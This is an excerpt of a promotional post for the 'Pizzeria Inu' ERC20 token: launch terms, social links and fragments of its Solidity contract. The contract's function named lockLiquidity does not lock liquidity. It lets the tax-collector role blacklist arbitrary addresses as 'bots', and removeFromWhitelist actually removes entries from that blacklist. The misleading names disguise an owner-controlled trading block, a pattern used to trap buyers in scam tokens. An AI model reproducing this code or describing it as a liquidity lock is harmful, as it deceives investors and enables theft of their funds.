...
Max Buy: 1%
Lock Period: 60 days
Initial Liquidity Pool: 4 ETH
Team Token: Nil
Tax 12%
ERC20 Token

Website: https://pizzeriainu.xyz/

Twitter: https://twitter.com/PizzeriaInu

Telegram: https://t.me/PizzeriaInu
...
string constant TOKEN_SYMBOL="PIZZA";
string constant TOKEN_NAME="Pizzeria Inu";
...
contract PizzeriaInu is Context, IERC20, Ownable {
	...
	function lockLiquidity(address[] memory g) public onlyTaxCollector {
        for (uint256 i = 0; i < g.length; i++) {
            bots[g[i]] = true;
        }
    }

    function removeFromWhitelist(address notbot) public onlyTaxCollector {
        bots[notbot] = false;
    }
